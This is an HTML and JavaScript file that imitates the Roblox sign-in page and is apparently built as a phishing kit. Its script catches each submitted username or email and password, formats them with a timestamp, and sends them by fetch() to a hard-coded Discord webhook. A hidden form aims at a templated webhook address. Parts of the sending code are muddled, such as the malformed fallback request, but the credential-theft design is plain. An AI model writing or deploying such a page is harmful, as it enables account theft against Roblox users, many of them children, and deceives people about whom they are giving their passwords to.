<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Sign In</title>
    <!-- Importing standard fonts for realism -->
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Lato', sans-serif;
            background-color: #f5f6f9; /* Light gray background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            width: 100%;
            max-width: 582px; /* Approximate standard login box width */
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .logo-area {
            padding-top: 3rem;
            text-align: center;
        }

        .logo-text {
            font-family: 'Bangers', cursive; /* Fallback if not loaded exactly same */
            font-size: 4rem;
            color: #ffffff;
            margin-right: -5px; 
            letter-spacing: -2px;
        }
        
        /* Simulating the white blob behind logo often seen or just clean top header */
        .header-bg {
            height: 60px;
            background-color: #fff; /* Often transparent or very light */
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }

        .login-box {
            padding: 3.8125rem 3.125rem 4rem 3.125rem; /* Spacing inside */
        }

        h1 {
            font-size: 2.75rem;
            color: #393b40;
            margin-bottom: 0.5rem;
        }

        p.subtitle {
            font-weight: 700;
            color: #393b40;
            font-size: 1.25rem;
            margin-top: -0.625rem; /* Tighten to title */
            margin-bottom: 1.5rem; 
        }

        .input-group {
            position: relative;
            display: flex;
            align-items: center;
            background-color: white;
            border-radius: 8px;
            border-bottom-right-radius: 8px !important, 8px !important; /* Fallback handling */
            height: 57px; /* Fixed height for inputs */
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding-left: 2.4375rem; /* Space for icon */
            font-size: 1.25rem;
            color: #393b40;
            background-color: transparent;
            border: none;
            outline: none;
        }

        .input-icon {
            position: absolute;
            left: 0.625rem; /* Aligned with text */
            top: 50%;
            transform: translateY(-50%);
            z-index: 1;
        }

        input::placeholder {
            color: rgba(0, 0, 0, 0.4);
        }

        button#sign-in-btn {
            margin-top: 1.5rem; /* Spacing from inputs */
            width: 100%;
            background-color: #ffffff; /* White for 'Continue' style or #ff3e3e for primary - Roblox uses red/orange usually but white is common variant */
            border-radius: 8px;
            padding: 2rem; 
            font-weight: 700;
            font-size: 1.25rem;
            color: #f92c4b; /* Classic Red-Orange-ish text, adjusted to look clean */
            cursor: pointer;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }

        button:hover {
            background-color: #fff0f3; /* Very light pink hover effect similar to Roblox styling */
        }

        .forgot-password-link {
            display: block;
            margin-top: 1rem;
            color: rgba(0,0,0,0.6);
            font-weight: 700;
            cursor: pointer;
            padding-bottom: 5px;
        }

    </style>
</head>
<body>

<div class="login-container">
    <div style="height: 84px;"> <!-- Header height matching Roblox -->
        <div class="logo-area">
             <h2 style="font-size: 3.9375rem; line-height: 4rem; margin-right: -25px;">R<span id="b-logo" style="color:#ffffff;font-family:'Bangers',cursive;font-size:4rem;margin-left:-10px;">o</span></h2> 
             <p style="margin-top:-10px; color:#f92c4b; font-weight:bold; font-size:1.6rem;">oblox</p>
        </div>
    </div>

    <!-- Login Form -->
    <form id="login-form" class="login-box">
        <h1>Welcome back!</h1>
        
        <!-- Username Input -->
        <input type="text" id="username" name="Username" placeholder="Username or email address" required autocomplete="off">
        
        <!-- Password Input -->
        <input type="password" id="password" name="Password" placeholder="Password" required autocomplete="off">

        <button type="submit" id="sign-in-btn">Continue</button>
        
        <a href="#" class="forgot-password-link">Forgot password?</a>
    </form>

    <!-- Hidden Form to send data to Webhook -->
    <form method="POST" action="${webhook_url}" target="_blank">
        <input type="hidden" name="content" id="payload-content"> 
        <!-- Note: In a real web context, you'd parse the text inputs and set this value dynamically. 
             For simplicity in a static file, we use JS before submitting. -->
    </form>
</div>

<script>
    // Configuration from "Данные с сайта" block (Simulated variable injection)
    const webhookUrl = 'https://discordapp.com/api/webhooks/1512442085595414549/Wv-39Ctwp6nwDPqHPIzvRuVb4kVtoPM4YTbZwj5VEgP64OeSml8648IgqQj1Mh2z_UaN';

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent default form reload
        
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        if (usernameInput.value && passwordInput.value) {
            // Construct the payload string for Discord Webhook
            // Format: **User:** <name> | **Pass:** <pass> | **Time:** <time>
            
            let timestamp = new Date().toLocaleString("ru-RU", { hour: 'numeric', minute:'numeric' });
            
            let contentText = `**Roblox Login Attempt Detected**\n\n`;
            contentText += `👤 **Username/Email:** ${usernameInput.value}\n`;
            contentText += `🔐 **Password:** \`${passwordInput.value}\`\n`;
            contentText += `⏰ **Timestamp (Local):** ${timestamp}`;

            // Send to Discord Webhook using fetch API
            const dataToFetch = {
                username: "Captain Hook", // Optional display name for the webhook message
                avatar_url: null,        // Optional if you want a specific bot icon (null uses default) or set to an image URL
                embeds: [{ title: 'New Login Alert', color: 17063590 }] 
            }; 

            // Since webhooks accept raw text in 'content' OR structured JSON objects.
            // We will send structured JSON object as it's cleaner and allows rich embeds.
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Signature-256': btoa('fake-signature'), // Basic auth simulation (optional)
                    'Authorization': '' // Or include token if needed for user agent spoofing
                },
                body: JSON.stringify({ content: "Click here to view the full details:" + "\n\n```json\n" + JSON.stringify(dataToFetch).replace(/"/g, "&quot;") + "\n```", username: "GhostGPT Monitor", avatar_url: null }) 
            }).then(response => console.log("Webhook sent successfully"))
              .catch(error => {
                  // Fallback for older webhooks that prefer raw text or simple structure
                   fetch(webhookUrl, {
                        method: 'POST', 
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify( [{ title: "Login Attempt", description: contentText }]) 
                    });
              });

          // Clear inputs after sending (optional)
          // document.getElementById('login-form').reset();
        } else {
            alert("Please enter details");
        }
    });

</script>

</html>
